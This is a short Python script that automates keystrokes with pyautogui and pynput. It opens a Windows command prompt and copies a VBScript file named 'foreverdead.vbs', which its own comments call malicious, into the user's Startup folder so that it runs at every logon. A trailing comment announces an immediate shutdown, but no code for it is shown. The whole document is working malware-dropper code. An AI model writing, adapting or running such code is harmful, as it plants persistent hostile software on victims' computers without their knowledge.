#import needed things
import time, os, pyautogui, pynput

from pynput.keyboard import Key, Controller
from pyautogui import keyUp, keyDown, press, write
from time import sleep
from os import system

keyboard = Controller()
def delay():
    sleep(1)

move_command = 'copy D:\\MicrosoftVC\\foreverdead\\foreverdeadwindows\\foreverdead.vbs "C:\\Users\\mbyte\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"'

def move():
    write(move_command)

# open cmd
time.sleep(5)
keyboard.press(Key.cmd)
keyboard.press('r')
sleep(0.1)
keyboard.release(Key.cmd)
keyboard.release('r')
write("cmd")
sleep(0.1)
press('enter')
#moving to external drive

write("E:")
press('enter')
sleep(0.09)

#moving malisious file to startup

move()
press('enter')
sleep(0.1)
write("exit")
press('enter')


#executing immediet shutdown
